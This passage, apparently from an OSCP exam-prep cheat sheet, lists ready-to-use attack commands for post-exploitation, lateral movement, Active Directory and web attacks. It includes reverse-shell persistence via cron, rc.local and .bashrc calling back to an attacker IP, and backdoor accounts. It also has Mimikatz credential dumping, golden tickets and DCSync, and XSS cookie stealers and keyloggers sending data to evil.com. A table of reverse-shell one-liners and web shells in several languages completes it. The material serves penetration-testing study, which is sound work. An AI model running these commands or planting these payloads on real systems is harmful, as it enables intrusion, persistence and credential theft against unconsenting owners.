**DLL Hijacking**:
```cmd
# Use Process Monitor to find missing DLLs
# Place malicious DLL in application directory
# Wait for application restart
```

**Potato Attacks (SeImpersonatePrivilege)**:
```cmd
# Check privilege
whoami /priv

# Download SweetPotato
# Usage
SweetPotato.exe -p whoami
```

**AlwaysInstallElevated**:
```powershell
# Check registry
Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer
Get-ItemProperty HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer

# Create MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f msi -o shell.msi

# Install
msiexec /quiet /qn /i C:\Users\Public\shell.msi
```

**UAC Bypass**:
```cmd
# Check UAC level
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System

# Metasploit
use exploit/windows/local/bypassuac_sdclt
set SESSION 1
set LHOST 192.168.0.1
run
```

---

## 6. Post-Exploitation

### 6.1 Linux Post-Exploitation

#### Credential Hunting
```bash
# Search for passwords
grep -r "password" /home/* 2>/dev/null
grep -r "pass" /var/www/* 2>/dev/null

# History files
cat ~/.bash_history
cat ~/.mysql_history
cat ~/.history

# SSH keys
find /home -name "id_rsa" 2>/dev/null
find /root -name "id_rsa" 2>/dev/null

# Config files
find / -name "*.conf" -exec grep -i pass {} \; 2>/dev/null
```

#### Maintain Access
```bash
# Add SSH key
mkdir -p ~/.ssh
echo "public_key" >> ~/.ssh/authorized_keys

# Backdoor user
useradd -m -s /bin/bash backdoor
passwd backdoor
usermod -aG sudo backdoor
```

#### Persistence
```bash
# Cron persistence
(crontab -l 2>/dev/null; echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.168.0.1/4444 0>&1'") | crontab -

# rc.local
echo "/bin/bash -c 'bash -i >& /dev/tcp/192.168.0.1/4444 0>&1'" >> /etc/rc.local

# .bashrc
echo 'bash -i >& /dev/tcp/192.168.0.1/4444 0>&1' >> ~/.bashrc
```

---

### 6.2 Windows Post-Exploitation

#### Credential Hunting
```cmd
# Search for passwords in files
findstr /si "password" C:\Users\*.txt
findstr /si "pass" C:\*.ini C:\*.config

# PowerShell history
type C:\Users\Username\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

# Unattended installs
dir C:\*.* /s /m *unattend*.xml
dir C:\*.* /s /m *sysprep*.inf

# Group Policy Preferences
dir C:\ProgramData\Microsoft\GroupPolicy\history\
```

#### Mimikatz
```cmd
# Run as Administrator
privilege::debug

# Dump credentials
sekurlsa::logonpasswords

# Dump SAM
lsadump::sam

# Dump cached domain credentials
lsadump::cache

# Pass the hash
sekurlsa::pth /user:Administrator /domain:domain.com /ntlm:hash /run:powershell

# DCSync
lsadump::dcsync /user:domain\user

# Export tickets
sekurlsa::tickets /export

# Pass the ticket
kerberos::ptt ticket.kirbi
```

#### SAM Database Extraction
```bash
# On Kali
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
impacket-secretsdump domain/user:password@192.168.0.1
```

#### Registry Hives
```cmd
# Save hives
reg save hklm\sam sam.bak
reg save hklm\security security.bak
reg save hklm\system system.bak

# Transfer and extract on Kali
impacket-secretsdump -sam sam.bak -security security.bak -system system.bak LOCAL
```

---

### 6.3 Hash Cracking

#### Hash Identification
```bash
hashid hash_value
hash-identifier
```

#### Hashcat Modes

| Hash Type | Mode |
|-----------|------|
| MD5 | 0 |
| NTLM | 1000 |
| SHA1 | 100 |
| SHA256 | 1400 |
| SHA512 | 1700 |
| NetNTLMv2 | 5600 |
| AS-REP | 18200 |
| TGS-REP (Kerberoast) | 13100 |
| KeePass | 13400 |
| SSH Key | 22921 |
| bcrypt | 3200 |

#### Hashcat Usage
```bash
# Basic
hashcat -m 1000 hash.txt rockyou.txt --force

# With rules
hashcat -m 5600 hash.txt rockyou.txt -r best64.rule --force

# Show cracked
hashcat -m 1000 hash.txt --show

# Benchmark
hashcat -b
```

#### John the Ripper
```bash
# Basic
john --wordlist=rockyou.txt hash.txt

# With rules
john --wordlist=rockyou.txt --rules hash.txt

# Show cracked
john --show hash.txt

# Format conversion
ssh2john id_rsa > ssh.hash
keepass2john database.kdbx > keepass.hash
```

---

## 7. Lateral Movement & Pivoting

### 7.1 Metasploit Pivoting

```bash
# Get Meterpreter session
use exploit/multi/handler

# Add route
use post/multi/manage/autoroute
set SESSION 1
run

# Or manually
route add 172.16.0.0 255.255.255.0 1

# SOCKS proxy
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set VERSION 5
run -j

# Use proxychains
# Edit /etc/proxychains4.conf
socks5 127.0.0.1 1080
```

### 7.2 SSH Tunneling

```bash
# Local port forward
ssh -L 8080:internal_host:80 user@jump_host

# Dynamic SOCKS proxy
ssh -D 1080 user@jump_host

# Remote port forward
ssh -R 8080:localhost:80 user@external_host

# Reverse SOCKS
ssh -R 1080 user@external_host

# SSH tunnel with proxycommand
ssh -o ProxyCommand='nc -x 127.0.0.1:1080 %h %p' user@internal_host
```

### 7.3 Port Forwarding with Socat

```bash
# Local port forward
socat TCP-LISTEN:8080,fork TCP:internal_host:80

# Remote port forward
socat TCP-LISTEN:8080,fork TCP:attacker_ip:80

# Encrypted
socat OPENSSL-LISTEN:443,cert=server.pem,verify=0,fork TCP:internal_host:80
```

### 7.4 Chisel (HTTP Tunneling)

```bash
# Server (Kali)
./chisel server --port 8080 --reverse

# Client (Victim)
./chisel client 192.168.0.1:8080 R:socks
./chisel client 192.168.0.1:8080 R:8080:internal_host:80
```

### 7.5 Windows Lateral Movement

```bash
# PsExec
psexec \\192.168.0.1 -u domain\user -p password cmd

# WMI
wmic /node:192.168.0.1 /user:domain\user /password:pass process call create "cmd.exe /c whoami > C:\temp\out.txt"

# PowerShell Remoting
$cred = Get-Credential
Enter-PSSession -ComputerName 192.168.0.1 -Credential $cred

# WinRM
winrs -r:192.168.0.1 -u:user -p:pass "whoami"

# Impacket
impacket-psexec domain/user:pass@192.168.0.1
impacket-wmiexec domain/user:pass@192.168.0.1

# Pass the Hash
impacket-psexec -hashes :ntlm_hash domain/user@192.168.0.1
```

---

## 8. Active Directory

### 8.1 AD Enumeration

#### PowerView
```powershell
# Import
Import-Module .\PowerView.ps1

# Domain info
Get-NetDomain
Get-NetDomainController

# Users
Get-NetUser
Get-NetUser | select cn,lastlogon,pwdlastset

# Groups
Get-NetGroup
Get-NetGroup "Domain Admins" | select member

# Computers
Get-NetComputer
Get-NetComputer | select operatingsystem,dnshostname

# SPN accounts
Get-NetUser -SPN | select samaccountname,serviceprincipalname

# Sessions
Get-NetSession -ComputerName target

# Local admin
Find-LocalAdminAccess

# Permissions
Get-ObjectAcl -Identity user

# Shares
Find-DomainShare
```

#### BloodHound
```powershell
# SharpHound collector
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\temp\

# Transfer and import to BloodHound
```

#### AD Attacks

**AS-REP Roasting**:
```bash
# GetNPUsers
impacket-GetNPUsers -dc-ip 192.168.0.1 -request -outputfile hashes.asreproast domain/user

# Rubeus
Rubeus.exe asreproast /nowrap

# Crack
hashcat -m 18200 hashes.asreproast rockyou.txt --force
```

**Kerberoasting**:
```bash
# GetUserSPNs
impacket-GetUserSPNs -request -dc-ip 192.168.0.1 domain/user

# Rubeus
Rubeus.exe kerberoast /outfile:hashes.kerberoast

# Crack
hashcat -m 13100 hashes.kerberoast rockyou.txt --force
```

**Pass the Hash**:
```bash
# Impacket
impacket-psexec -hashes :ntlm_hash domain/user@192.168.0.1
impacket-wmiexec -hashes :ntlm_hash domain/user@192.168.0.1

# CrackMapExec
crackmapexec smb 192.168.0.1 -u user -H ntlm_hash

# smbclient
smbclient \\\\192.168.0.1\\share -U user --pw-nt-hash ntlm_hash
```

**Overpass the Hash**:
```cmd
# Mimikatz
sekurlsa::pth /user:user /domain:domain.com /ntlm:ntlm_hash /run:powershell

# Now use Kerberos
net use \\fileserver
```

**Golden Ticket**:
```cmd
# Get krbtgt hash
lsadump::dcsync /user:krbtgt

# Create golden ticket
kerberos::golden /user:Administrator /domain:domain.com /sid:S-1-5-21-xxx /krbtgt:hash /ptt

# Access DC
PsExec \\dc1 cmd
```

**Silver Ticket**:
```cmd
# Create service ticket
kerberos::golden /user:user /domain:domain.com /sid:S-1-5-21-xxx /target:server.domain.com /service:http /rc4:hash /ptt

# Access service
iwr -UseDefaultCredentials http://server
```

**DCSync**:
```cmd
# Mimikatz
lsadump::dcsync /user:domain\user

# Impacket
impacket-secretsdump -just-dc-user user domain/user:pass@192.168.0.1
```

---

## 9. Web Application Attacks

### 9.1 Directory Traversal / LFI

```bash
# Basic payloads
../../../../../etc/passwd
..\..\..\..\..\windows\win.ini

# URL encoded
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

# Double encoded
%252e%252e%252f%252e%252e%252fetc%252fpasswd

# Null byte
../../../../../etc/passwd%00.jpg

# PHP wrapper (LFI to RCE)
# Read files
php://filter/convert.base64-encode/resource=config.php

# Execute code
data://text/plain,<?php system($_GET['cmd']);?>

# Log poisoning
# Inject PHP in User-Agent
<?php system($_GET['cmd']);?>
# Then include log
../../../../../var/log/apache2/access.log&cmd=id
```

### 9.2 File Upload Bypasses

```bash
# Extension bypass
shell.php.jpg
shell.pHP
shell.php5
shell.phtml

# MIME bypass
Content-Type: image/jpeg

# Double extension
shell.php;.jpg
shell.php%00.jpg

# Magic bytes
GIF89a;<?php system($_GET['cmd']);?>
```

### 9.3 SQL Injection

```sql
-- Union-based
' UNION SELECT null,null,null -- -
' UNION SELECT database(),user(),@@version -- -

-- Error-based
' AND 1=1 -- -
' AND 1=2 -- -
' OR 1=1 -- -

-- Boolean blind
' AND 1=1 -- -
' AND 1=2 -- -

-- Time-based
' AND SLEEP(5) -- -
' AND IF(1=1, SLEEP(5), 0) -- -

-- Authentication bypass
' OR 1=1 -- -
' OR '1'='1' -- -

-- Comment out
' -- //
' #
/* */
```

### 9.4 XSS

```html
<!-- Basic -->
<script>alert(1)</script>

<!-- Image -->
<img src=x onerror=alert(1)>

<!-- Cookie stealer -->
<script>new Image().src="http://evil.com/steal?cookie="+document.cookie;</script>

<!-- Keylogger -->
<script>
document.onkeypress = function(e) {
    new Image().src = "http://evil.com/log?key=" + e.key;
}
</script>
```

### 9.5 CSRF
```html
<!-- Image CSRF -->
<img src="http://target.com/transfer?amount=1000&to=attacker">

<!-- Form auto-submit -->
<form action="http://target.com/transfer" method="POST">
    <input type="hidden" name="amount" value="1000">
    <input type="hidden" name="to" value="attacker">
</form>
<script>document.forms[0].submit();</script>
```

---

## 10. Password Cracking

### 10.1 Wordlist Creation

```bash
# CeWL (website wordlist)
cewl -w wordlist.txt -d 5 -m 5 http://target.com

# Crunch (custom)
crunch 8 10 abcdefghijklmnopqrstuvwxyz -o wordlist.txt

# RSMangler
rsmangler --input wordlist.txt --output mangled.txt

# Combine
cat wordlist1.txt wordlist2.txt > combined.txt
sort -u combined.txt > unique.txt
```

### 10.2 Rule-Based Attacks

```bash
# Hashcat rules
hashcat -m 1000 hash.txt rockyou.txt -r best64.rule --force

# John rules
john --wordlist=rockyou.txt --rules hash.txt

# Custom rules
# /etc/john/john.conf
[List.Rules:MyRule]
c $1 $3 $7 $!
c $1 $3 $7 $@
```

---

## 11. Miscellaneous Utilities

### 11.1 Reverse Shell One-Liners

| Language | Command |
|----------|---------|
| Bash | `/bin/bash -i >& /dev/tcp/192.168.0.1/4444 0>&1` |
| Netcat | `nc 192.168.0.1 4444 -e /bin/sh` |
| Python | `python -c 'import socket,subprocess,os;...'` |
| PHP | `php -r '$s=fsockopen("192.168.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'` |
| Perl | `perl -MIO -e '...'` |
| Ruby | `ruby -rsocket -e 'f=TCPSocket.open("192.168.0.1",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'` |
| Node.js | `require('child_process').exec('bash -c "bash -i >& /dev/tcp/192.168.0.1/4444 0>&1"')` |
| Powershell | `powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object System.Net.Sockets.TCPClient('192.168.0.1',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb+'PS '+(pwd).Path+'> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()"` |

### 11.2 Web Shells

```bash
# PHP
<?php system($_GET['cmd']); ?>

# ASP
<% eval request("cmd") %>

# ASPX
<%@ Page Language="Jscript" %><% eval(Request.Item["cmd"]); %>

# JSP
<%= Runtime.getRuntime().exec(request.getParameter("cmd")) %>

# Perl
system($_GET['cmd']);

# Python
import os; os.system(request.GET['cmd'])

# Ruby
system(params['cmd'])
```

### 11.3 Search for Flags

```bash
# Linux
find / -name "flag.txt" 2>/dev/null
find / -name "proof.txt" 2>/dev/null
grep -r "OS{" / 2>/dev/null
grep -r "flag" / 2>/dev/null

# Windows
dir /s *flag*.txt
dir /s *proof*.txt
findstr /si "OS{" *.*
```

---

## 12. Exam-Day Checklist

### Phase 1: Initial Recon
- [ ] Configure /etc/hosts with target IPs
- [ ] Create workspace directory
- [ ] Create notes file
- [ ] Run AutoRecon / initial Nmap scans
- [ ] Full TCP scan (all ports)
- [ ] UDP scan (top 100)
- [ ] Identify open services

### Phase 2: Service Enumeration
- [ ] Web: Gobuster/Dirbuster, WPScan, Nikto
- [ ] SMB: enum4linux, smbclient, CrackMapExec
- [ ] FTP: Anonymous login check
- [ ] SSH: Hydra/Medusa brute force
- [ ] SNMP: onesixtyone, snmpwalk
- [ ] SMTP: VRFY/EXPN enumeration
- [ ] DNS: Zone transfer attempts
- [ ] NFS: showmount, mount drives

### Phase 3: Exploitation
- [ ] Searchsploit / Google for vulnerabilities
- [ ] Modify public exploits as needed
- [ ] Generate payloads with msfvenom
- [ ] Establish initial foothold
- [ ] Upgrade to interactive TTY shell
- [ ] Transfer enumeration tools

### Phase 4: Post-Exploitation
- [ ] Run LinPEAS / winPEAS
- [ ] Check sudo permissions
- [ ] Check SUID files / capabilities
- [ ] Check scheduled tasks / cron jobs
- [ ] Check for writable files/directories
- [ ] Dump credentials (Mimikatz, hashdump)
- [ ] Search for password files
- [ ] Check history files

### Phase 5: Lateral Movement
- [ ] Enumerate network (ipconfig, route, ARP)
- [ ] Port scan internal network
- [ ] Identify additional targets
- [ ] Crack hashes
- [ ] Pass the hash
- [ ] Kerberoast / AS-REP roast
- [ ] SSH key reuse
- [ ] Password reuse

### Phase 6: Active Directory
- [ ] Enumerate domain users/groups/computers
- [ ] BloodHound data collection
- [ ] Identify attack paths
- [ ] Kerberoasting
- [ ] AS-REP roasting
- [ ] Pass the hash
- [ ] DCSync
- [ ] Golden ticket
- [ ] Silver ticket

### Phase 7: Cleanup
- [ ] Remove uploaded files
- [ ] Delete backdoors
- [ ] Remove scheduled tasks/cron jobs
- [ ] Close reverse shells
- [ ] Clear logs (if authorized)

---

## Quick Reference Cards

### Nmap Common Ports
| Port | Service |
|------|---------|
| 21 | FTP |
| 22 | SSH |
| 25 | SMTP |
| 53 | DNS |
| 80 | HTTP |
| 110 | POP3 |
| 135 | RPC |
| 139 | NetBIOS |
| 143 | IMAP |
| 443 | HTTPS |
| 445 | SMB |
| 873 | rsync |
| 993 | IMAPS |
| 995 | POP3S |
| 2049 | NFS |
| 3306 | MySQL |
| 3389 | RDP |
| 5432 | PostgreSQL |
| 5900 | VNC |
| 5985 | WinRM HTTP |
| 5986 | WinRM HTTPS |
| 8080 | HTTP Proxy |

### Common Wordlist Locations
```bash
/usr/share/wordlists/rockyou.txt
/usr/share/wordlists/dirb/common.txt
/usr/share/wordlists/dirb/big.txt
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
/usr/share/wordlists/fasttrack.txt
/usr/share/seclists/
/usr/share/metasploit-framework/data/wordlists/
```

### Quick Lynis Commands
```bash
# Linux
find / -perm -u=s -type f 2>/dev/null
sudo -l
cat /etc/crontab
uname -a
cat /etc/passwd

# Windows
systeminfo
whoami /all
net user
net localgroup
wmic qfe list
```

---

**Remember**: Enumeration is the key to OSCP success. Take thorough notes, be methodical, and when stuck, enumerate more.

> "Try Harder" - Offensive Security